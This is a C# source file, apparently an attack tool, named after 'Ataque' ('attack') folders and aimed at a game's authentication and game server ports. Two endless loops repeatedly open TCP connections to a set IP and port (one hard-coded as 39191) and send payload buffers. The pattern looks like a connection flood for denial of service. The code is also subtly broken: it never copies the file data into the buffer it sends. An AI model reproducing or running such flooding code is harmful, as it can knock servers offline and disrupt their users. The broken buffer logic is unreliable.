using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace AsyncRun
{
    public class SocketComponets
    {
        public static Loader loader = Loader.INTs();
        public static void SendByteInTextAuth(string arquivo)
        {
            try
            {
                while(true)
                {
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    socket.Connect(new IPEndPoint(IPAddress.Parse(loader.IP), loader.PORT));
                    if (socket.Connected)
                    {
                        byte[] filename = Encoding.ASCII.GetBytes(arquivo);
                        byte[] ler = File.ReadAllBytes($"Ataque\\{arquivo}");
                        byte[] enviar = new byte[4 + filename.Length + ler.Length];
                        byte[] filenameLength = BitConverter.GetBytes($"{arquivo}".Length);
                     

                        socket.BeginSend(enviar, 0, enviar.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                        Logger.Send("[AUTH] Enviando Bytes de textos.");
                    }
                    socket.Close();
                }

            }
            catch (Exception ex)
            {
                Logger.Error(ex.ToString());
            }
        }
        private static void SendCallback(IAsyncResult ar)
        {
            Socket handler = (Socket)ar.AsyncState;
            if (handler != null && handler.Connected)
                handler.EndSend(ar);

        }
        public static void SendByteInTextGame(string arquivo)
        {
            try
            {
                for (; ; )
                {
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    socket.Connect(new IPEndPoint(IPAddress.Parse(loader.IP), 39191));
                    if (socket.Connected)
                    {
                        byte[] filename = Encoding.ASCII.GetBytes(arquivo);
                        byte[] ler = File.ReadAllBytes($"Ataque\\{arquivo}");
                        byte[] enviar = new byte[4 + filename.Length + ler.Length];
                        byte[] filenameLength = BitConverter.GetBytes($"{arquivo}".Length);

                        socket.BeginSend(enviar, 0, enviar.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                        Logger.Send("[GAME] Enviando Bytes de textos.");
                    }
                   socket.Close();
                }

            }
            catch (Exception ex)
            {
                Logger.Error(ex.ToString());
            }
        }
    }
}
